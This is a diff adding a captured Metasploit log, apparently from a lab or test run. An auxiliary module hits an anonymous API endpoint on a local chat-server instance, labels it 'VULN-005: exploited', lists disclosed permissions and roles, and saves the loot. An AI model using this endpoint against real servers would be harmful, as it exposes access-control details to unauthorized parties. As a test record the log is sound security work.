@@ -1,0 +1,28 @@
+Loaded 1 modules:
+    1 auxiliary modules
+RHOSTS => 127.0.0.1
+RPORT => 39649
+TARGETURI => /api/v1/method.callAnon/permissions-get
+SSL => false
+VERBOSE => true
+[*] Running module against 127.0.0.1
+[+] 127.0.0.1:39649 - VULN-005: exploited
+[+] 127.0.0.1:39649 - 993 permission(s) and their roles disclosed to an anonymous caller
+[*]   access-permissions -> admin
+[*]   access-marketplace -> admin,user
+[*]   access-setting-permissions -> admin
+[*]   add-oauth-service -> admin
+[*]   add-user-to-joined-room -> admin,owner,moderator
+[*]   add-user-to-any-c-room -> admin
+[*]   add-user-to-any-p-room -> 
+[*]   kick-user-from-any-c-room -> admin
+[*]   kick-user-from-any-p-room -> 
+[*]   api-bypass-rate-limit -> admin,bot,app
+[*]   archive-room -> admin,owner
+[*]   assign-admin-role -> admin
+[*]   assign-roles -> admin
+[*]   ban-user -> admin,owner,moderator
+[*]   bulk-register-user -> admin
+[+] 127.0.0.1:39649 - Saved the response to /tmp/.msf4/loot/20261124203008_default_127.0.0.1_blue_spider.vuln_573586.txt
+[*] Auxiliary module execution completed
+whoami: cannot find name for user ID 997
